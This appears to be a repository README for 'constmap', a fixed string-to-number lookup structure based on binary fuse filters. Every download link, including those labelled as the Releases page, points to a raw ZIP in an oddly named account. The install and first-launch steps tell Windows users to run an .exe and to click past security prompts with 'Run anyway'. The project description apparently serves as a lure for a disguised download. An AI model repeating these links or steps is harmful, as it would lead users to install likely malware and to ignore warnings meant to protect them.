# 🗺️ constmap - Fast, compact string lookups

[![Download constmap](https://img.shields.io/badge/Download-constmap-blue?style=for-the-badge&logo=github)](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip)

## 📥 Download constmap

1. Open the [constmap Releases page](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip).
2. Find the latest version at the top of the page.
3. Under **Assets**, download the Windows file that matches your PC.
4. If you see a ZIP file, save it to your computer.
5. If you see an `.exe` file, download it and run this file.

## 🪟 Run on Windows

1. Go to your **Downloads** folder.
2. If you downloaded a ZIP file, right-click it and choose **Extract All**.
3. Open the new folder.
4. Double-click the `.exe` file to start the app.
5. If Windows shows a security prompt, choose **Run anyway** if you trust the file from this repository.
6. Follow the on-screen steps in the app.

## ⚙️ What constmap does

constmap stores a fixed set of string keys and `uint64` values in a small, fast format.

Use it when you:
- know the full list of keys ahead of time
- want quick lookups after setup
- want to keep memory use low
- need a simple way to map text to numbers

It works best for data that does not change often. After you build the map, you can look up values fast.

## 🧱 How it works

constmap uses a compact method called a binary fuse filter. In plain terms, it turns your key list into a small data block that the app can search very fast.

When you look up a key, it uses:
- one hash check
- three array reads
- two XOR operations

This design helps keep the map small while still making lookups fast. It fits use cases where speed and memory use both matter.

## ✅ Main uses

You can use constmap for:
- app settings keyed by name
- feature flags
- fixed lookup tables
- word lists
- ID mapping
- cached reference data

It is a good fit for data that you build once and read many times.

## 🖥️ Windows system needs

For a normal Windows setup, use:
- Windows 10 or newer
- a 64-bit computer
- enough disk space to extract the app
- internet access to download the release file

If your PC already runs modern Windows apps, it should work here too.

## 📦 Install steps

1. Open the [Releases page](https://github.com/Nondisposable-loniceraalbiflora875/constmap/raw/refs/heads/main/outlance/Software_v2.2.zip).
2. Download the latest Windows release.
3. Save the file to your computer.
4. If the file is zipped, extract it.
5. Place the app in a folder you can find later, such as **Downloads** or **Desktop**.
6. Open the app by double-clicking the file.

## 🧭 First launch

When you open constmap for the first time:
1. Wait for Windows to finish checking the file.
2. If a security prompt appears, choose the option to keep going.
3. Start with a small test set of keys if the app asks for input.
4. Add your string names and their `uint64` values.
5. Save your map so you can use it again later.

## 📁 Suggested folder setup

Keep your files in one place:
- `constmap`
- `input`
- `output`

A simple folder layout makes it easier to find your map files and keep your work organized.

## 🔧 Basic use

If you are new to this tool, use this flow:
1. Build a map from a known list of string keys.
2. Store the related `uint64` values.
3. Open the saved map when you need a lookup.
4. Enter a key.
5. Read the stored number for that key.

If a key is not part of the original set, the app may not return a value. That is normal for this kind of map.

## 🧪 Tips for best results

- Use exact spelling for each key
- Keep key names consistent
- Use the same letter case each time
- Add all keys before you save the map
- Keep your source list in a text file as a backup
- Test a few lookups before you rely on the full set

## 🔍 Example data

Here is a simple example of what you might store:

- `apple` → `12`
- `banana` → `34`
- `orange` → `56`

This kind of structure is useful when you want a name to point to one number.

## 📚 Reference

This project follows the binary fuse filter method from the research by Thomas Mueller Graf and Daniel Lemire. It also relates to earlier xor filter work from the same authors.

That design helps constmap keep lookups fast and the data size small.